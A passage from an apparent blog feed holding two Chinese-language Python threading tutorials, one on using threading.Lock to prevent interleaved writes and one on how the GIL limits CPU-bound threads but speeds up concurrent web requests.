 t1.join()</span><br><span class="line">   t2.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   A = <span class="number">0</span></span><br><span class="line">   main()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 6_lock.py</span></span><br><span class="line">job1 1</span><br><span class="line">job1 2</span><br><span class="line">job1 3</span><br><span class="line">job1 4</span><br><span class="line">job1 5job2 15</span><br><span class="line">job2 </span><br><span class="line">job1 2625</span><br><span class="line">job2</span><br><span class="line">job1 36 37</span><br><span class="line">job2 </span><br><span class="line">47</span><br><span class="line">job2 57</span><br><span class="line">job2 67</span><br><span class="line">job2 77</span><br></pre></td></tr></table></figure><p>可以看到不使用lock的时候，打印的结果很混乱。</p><h1 id="0x02-使用lock的情况"><a href="#0x02-使用lock的情况" class="headerlink" title="0x02 使用lock的情况"></a>0x02 使用lock的情况</h1><p>使用lock的方法是， 在每个线程执行运算修改共享内存之前，执行lock.acquire()将共享内存上锁， 确保当前线程执行时，内存不会被其他线程访问，执行运算完毕后，使用lock.release()将锁打开， 保证其他的线程可以使用该共享内存。</p><p>为job1和job2加锁：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">()</span>:</span> <span class="comment"># 全局变量A的值每次加1，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A,lock</span><br><span class="line">   lock.acquire() <span class="comment"># 上锁</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">1</span></span><br><span class="line">      print(<span class="string">'job1'</span>,A)</span><br><span class="line">   lock.release() <span class="comment"># 开锁</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">()</span>:</span><span class="comment"># 全局变量A的值每次加10，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A,lock</span><br><span class="line">   lock.acquire() <span class="comment"># 上锁</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">10</span></span><br><span class="line">      print(<span class="string">'job2'</span>,A)</span><br><span class="line">   lock.release() <span class="comment"># 开锁</span></span><br></pre></td></tr></table></figure><p>在程序入口处定义一个lock</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   lock = threading.Lock()</span><br><span class="line">   A = <span class="number">0</span></span><br><span class="line">   main()</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">()</span>:</span> <span class="comment"># 全局变量A的值每次加1，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A,lock</span><br><span class="line">   lock.acquire()</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">1</span></span><br><span class="line">      print(<span class="string">'job1'</span>,A)</span><br><span class="line">   lock.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">()</span>:</span><span class="comment"># 全局变量A的值每次加10，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A,lock</span><br><span class="line">   lock.acquire()</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">10</span></span><br><span class="line">      print(<span class="string">'job2'</span>,A)</span><br><span class="line">   lock.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> <span class="comment"># 定义两个线程并执行job1和job2</span></span><br><span class="line">   t1 = threading.Thread(target=job1)</span><br><span class="line">   t2 = threading.Thread(target=job2)</span><br><span class="line">   t1.start()</span><br><span class="line">   t2.start()</span><br><span class="line">   t1.join()</span><br><span class="line">   t2.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   lock = threading.Lock()</span><br><span class="line">   A = <span class="number">0</span></span><br><span class="line">   main()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 6_lock.py</span></span><br><span class="line">job1 1</span><br><span class="line">job1 2</span><br><span class="line">job1 3</span><br><span class="line">job1 4</span><br><span class="line">job1 5</span><br><span class="line">job1 6</span><br><span class="line">job1 7</span><br><span class="line">job2 17</span><br><span class="line">job2 27</span><br><span class="line">job2 37</span><br><span class="line">job2 47</span><br><span class="line">job2 57</span><br><span class="line">job2 67</span><br><span class="line">job2 77</span><br></pre></td></tr></table></figure><p>从运行结果来看，使用lock后，一个线程一个线程的执行完，两个线程之间互不影响。<br>至此，整个【Python Threading 学习笔记】系列更新完毕。</p><blockquote><p>代码项目地址：<a href="https://github.com/teamssix/Python-Threading-study-notes" target="_blank" rel="noopener">https://github.com/teamssix/Python-Threading-study-notes</a><br>参考文章：<br>1、<a href="https://www.jianshu.com/p/05b6a6f6fdac" target="_blank" rel="noopener">https://www.jianshu.com/p/05b6a6f6fdac</a><br>2、<a href="https://morvanzhou.github.io/tutorials/python-basic/threading" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/python-basic/threading</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;往期内容：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/1901031-202253.html&quot;&gt;1、什么是多线程？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191101-112015.html&quot;&gt;2、添加线程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191102-102624.html&quot;&gt;3、join功能&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191103-092239.html&quot;&gt;4、Queue功能&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191104-101112.html&quot;&gt;5、不一定有效率GIL&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;0x00-关于线程锁lock&quot;&gt;&lt;a href=&quot;#0x00-关于线程锁lock&quot; class=&quot;headerlink&quot; title=&quot;0x00 关于线程锁lock&quot;&gt;&lt;/a&gt;0x00 关于线程锁lock&lt;/h1&gt;&lt;p&gt;多线程和多进程最大的不同在于，多进程中，同一个变量，各自有一份拷贝存在于每个进程中，互不影响，而多线程中，所有变量都由所有线程共享，所以，任何一个变量都可以被任何一个线程修改，因此，线程之间共享数据最大的危险在于多个线程同时改一个变量，把内容给改乱了。&lt;/p&gt;
&lt;p&gt;而使用lock就可以在不同线程使用同一共享内存时，能够确保线程之间互不影响。&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="多线程" scheme="https://www.teamssix.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【Python Threading 学习笔记】5、不一定有效率GIL</title>
    <link href="https://www.teamssix.com/year/191104-101112.html"/>
    <id>https://www.teamssix.com/year/191104-101112.html</id>
    <published>2019-11-04T02:11:12.000Z</published>
    <updated>2019-12-20T01:17:30.055Z</updated>
    
    <content type="html"><![CDATA[<p>往期内容：</p><p><a href="https://www.teamssix.com/year/1901031-202253.html">1、什么是多线程？</a></p><p><a href="https://www.teamssix.com/year/191101-112015.html">2、添加线程</a></p><p><a href="https://www.teamssix.com/year/191102-102624.html">3、join功能</a></p><p><a href="https://www.teamssix.com/year/191103-092239.html">4、Queue功能</a></p><h1 id="0x00-关于GIL"><a href="#0x00-关于GIL" class="headerlink" title="0x00 关于GIL"></a>0x00 关于GIL</h1><p>GIL的全称是Global Interpreter Lock(全局解释器锁)，来源是python设计之初的考虑，为了数据安全所做的决定。</p><a id="more"></a><p>每个CPU在同一时间只能执行一个线程（在单核CPU下的多线程其实都只是并发，不是并行，并发和并行从宏观上来讲都是同时处理多路请求的概念。但并发和并行又有区别，并行是指两个或者多个事件在同一时刻发生；而并发是指两个或多个事件在同一时间间隔内发生。）</p><p>在Python多线程下，每个线程的执行方式如下：</p><p>1.获取GIL</p><p>2.执行代码直到sleep或者是python虚拟机将其挂起。</p><p>3.释放GIL</p><p>可见，某个线程想要执行，必须先拿到GIL，我们可以把GIL看作是“通行证”，并且在一个python进程中，GIL只有一个。拿不到通行证的线程，就不允许进入CPU执行。</p><p>也就是说尽管Python支持多线程，但是因为GIL的存在，使得Python还是一次性只能处理一个东西，那是不是说Python中的多线程就完全没用了呢，当然不是的。</p><p>GIL往往只会影响到那些严重依赖CPU的程序，比如各种循环处理、计数等这种CPU密集型的程序；如果程序中大部分只会涉及到I/O，比如文件处理、网络爬虫等这种IO密集型的程序，那么多线程就能够有效的提高效率，因为在爬虫的时候大部分时间都在等待。</p><p>实际上，你完全可以放心的创建几千个Python线程， 现代操作系统运行这么多线程没有任何压力，没啥可担心的。</p><h1 id="0x01-测试GIL"><a href="#0x01-测试GIL" class="headerlink" title="0x01 测试GIL"></a>0x01 测试GIL</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(lists,q)</span>:</span></span><br><span class="line">   res = sum(lists)</span><br><span class="line">   q.put(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multithreading</span><span class="params">(lists)</span>:</span></span><br><span class="line">   q = Queue()</span><br><span class="line">   threads_list = []</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">      t = threading.Thread(target=job,args=(copy.copy(lists),q),name = <span class="string">'任务 %i'</span> % i)</span><br><span class="line">      t.start()</span><br><span class="line">      threads_list.append(t)</span><br><span class="line">   <span class="keyword">for</span> t <span class="keyword">in</span> threads_list:</span><br><span class="line">      t.join()</span><br><span class="line"></span><br><span class="line">   total = <span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">      total += q.get()</span><br><span class="line">   print(<span class="string">'使用线程运算结果:'</span>,total)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normal</span><span class="params">(lists)</span>:</span></span><br><span class="line">   total = sum(lists)</span><br><span class="line">   print(<span class="string">'不使用线程运算结果:'</span>,total)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req_job</span><span class="params">(i)</span>:</span></span><br><span class="line">   requests.get(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req_multithreading</span><span class="params">(req_lists)</span>:</span></span><br><span class="line">   threads_list = []</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">      t = threading.Thread(target=req_job,args=(req_lists[i],),name=<span class="string">'爬虫任务 %i'</span> % i)</span><br><span class="line">      t.start()</span><br><span class="line">      threads_list.append(t)</span><br><span class="line">   <span class="keyword">for</span> t <span class="keyword">in</span> threads_list:</span><br><span class="line">      t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req_normal</span><span class="params">(req_lists)</span>:</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> req_lists:</span><br><span class="line">      requests.get(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   lists = list(range(<span class="number">1000000</span>)) <span class="comment"># 完成一个较大的计算</span></span><br><span class="line">   req_lists = [<span class="string">'https://www.teamssix.com'</span>,<span class="string">'https://github.com/teamssix'</span>,<span class="string">'https://me.csdn.net/qq_37683287'</span>,<span class="string">'https://space.bilibili.com/148389186'</span>]</span><br><span class="line">   start_time = time.time()</span><br><span class="line">   multithreading(lists)</span><br><span class="line">   print(<span class="string">'计算使用线程耗时:'</span>, time.time() - start_time,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">   start_time = time.time()</span><br><span class="line">   normal(lists * <span class="number">4</span>)</span><br><span class="line">   print(<span class="string">'计算不使用线程耗时:'</span>, time.time() - start_time,<span class="string">'\n'</span>)</span><br><span class="line">   start_time = time.time()</span><br><span class="line">   req_multithreading(req_lists)</span><br><span class="line">   print(<span class="string">'爬虫使用线程耗时:'</span>, time.time() - start_time)</span><br><span class="line">   start_time = time.time()</span><br><span class="line">   req_normal(req_lists)</span><br><span class="line">   print(<span class="string">'爬虫不使用线程耗时:'</span>, time.time() - start_time)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 5_GIL.py</span></span><br><span class="line">使用线程运算结果: 1999998000000</span><br><span class="line">计算使用线程耗时: 0.39594030380249023 </span><br><span class="line"></span><br><span class="line">不使用线程运算结果: 1999998000000</span><br><span class="line">计算不使用线程耗时: 0.3919515609741211</span><br><span class="line"></span><br><span class="line">爬虫使用线程耗时: 2.2410056591033936</span><br><span class="line">爬虫不使用线程耗时: 7.1159656047821045</span><br></pre></td></tr></table></figure><p>可以看到在计算程序的代码中不使用线程和使用线程的运算结果是相同的，说明不使用线程和使用线程的程序都进行了一样多次的运算，但是很明显可以看到计算的耗时并没有少很多，按照预期我们使用了4个线程，应该会快近4倍才对，这就是因为GIL在作怪。<br>与此同时，可以看到在使用request对一个url发起get请求的时候，使用线程比不使用线程快了3倍多，也进一步的反映出在使用Python进行爬虫的时候，多线程确实可以很大程度上提高效率，但是在进行密集计算任务的时候，多线程就显得很鸡肋了。</p><blockquote><p>代码项目地址：<a href="https://github.com/teamssix/Python-Threading-study-notes" target="_blank" rel="noopener">https://github.com/teamssix/Python-Threading-study-notes</a><br>参考文章：<br>1、<a href="https://zhuanlan.zhihu.com/p/20953544" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/20953544</a><br>2、<a href="https://morvanzhou.github.io/tutorials/python-basic/threading" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/python-basic/threading</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;往期内容：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/1901031-202253.html&quot;&gt;1、什么是多线程？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191101-112015.html&quot;&gt;2、添加线程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191102-102624.html&quot;&gt;3、join功能&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191103-092239.html&quot;&gt;4、Queue功能&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;0x00-关于GIL&quot;&gt;&lt;a href=&quot;#0x00-关于GIL&quot; class=&quot;headerlink&quot; title=&quot;0x00 关于GIL&quot;&gt;&lt;/a&gt;0x00 关于GIL&lt;/h1&gt;&lt;p&gt;GIL的全称是Global Interpreter Lock(全局解释器锁)，来源是python设计之初的考虑，为了数据安全所做的决定。&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="多线程" scheme="https://www.teamssix.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
